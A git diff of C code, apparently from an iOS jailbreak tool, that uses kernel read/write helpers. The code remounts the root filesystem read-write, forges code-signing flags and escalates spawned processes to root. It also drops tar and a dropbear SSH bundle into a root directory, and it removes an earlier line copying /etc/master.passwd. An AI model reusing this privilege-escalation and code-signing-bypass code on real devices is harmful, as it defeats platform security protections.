@@ -12,6 +12,8 @@
 #include <dirent.h>
 #include <sys/fcntl.h>
 #include <sys/mount.h>
+#include <sys/stat.h>
+#include <spawn.h>
 
 #include "kdbg.h"
 #include "kutils.h"
@@ -275,23 +277,21 @@ void dumpBsd_Info(){
     }
 }
 
-void setPlatform(){
-    uint32_t c_csflags = get_csflags(getpid());
+void setPlatform(uint32_t pid){
+    uint32_t c_csflags = get_csflags(pid);
     printf("Current csflags: 0x%07x\n",c_csflags);
     printf("Setting csflags 'CS_PLATFORM_BINARY'\n");
     uint32_t cflags = (get_csflags(getpid()) | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD );
-    set_csflags(getpid(),cflags);
-    printf("New csflags: 0x%07x\n",get_csflags(getpid()));
+    set_csflags(pid,cflags);
+    printf("New csflags: 0x%07x\n",get_csflags(pid));
 }
 
 
-uint32_t startBin(){
-    return -1;
-}
+
 
 int remountRW(){
     // Remount / as rw - patch by xerub
-    // and modified by stek29
+    // and modified by @ninjaprawn - https://github.com/ninjaprawn/async_awake-fun/blob/master/async_wake_ios/the_fun_part/fun.c
     {
         vm_offset_t off = 0xd8;
         uint64_t _rootvnode = find_rootvnode();
@@ -332,8 +332,45 @@ int remountRW(){
     return 0;
 }
 
-void copyFiles(){
-    cpFile("/etc/master.passwd", "/tmp/master.bak");
-    dirList("/bin");
-    printFile("/tmp/master.bak");
+char* appendString(char *str1, char *str2){
+    char * new_str ;
+    if((new_str = malloc(strlen(str1)+strlen(str2)+1)) != NULL){
+        new_str[0] = '\0';   // ensures the memory is an empty string
+        strcat(new_str,str1);
+        strcat(new_str,str2);
+    }
+    return new_str;
+}
+
+uint32_t startBin(const char *bin,const char* args[]){
+    //inject trust
+    printf("Injecting trust for application\n");
+    return 0;
+    printf("Spawning binary application: %s\n",bin);
+    int pid;
+    int rv = posix_spawn(&pid, bin, NULL, NULL, (char**)args, NULL);
+    printf("Application started, has pid: %d, rv=%d\n",pid,rv);
+    sleep(5);
+    //now we need to elevate the app to root
+    powerup(pid);
+    //and change csflags
+    setPlatform(pid);
+    waitpid(pid, NULL, 0);
+    return rv;
+}
+
+void copyFiles(char *cwd){
+    printf("App directory: %s\n",cwd);
+    //copy tar and dropbear to the root
+    //and extract :D
+    //make a new directory for this
+    mkdir("/staaldraad/", 0755);
+    cpFile(appendString(cwd,"/tar"), "/staaldraad/tar");
+    chmod("/staaldraad/tar", 0777);
+    cpFile(appendString(cwd,"/bearbins.tar"), "/staaldraad/bearbins.tar");
+    dirList("/staaldraad/");
+    //printFile("/tmp/master.bak");
+    //call untar
+    startBin("/staaldraad/tar", (char **)&(const char*[]){"/staaldraad/tar","-xpf","/staaldraad/bearbins.tar", "-C", "/staaldraad/"});
+    dirList("/staaldraad/");
 }
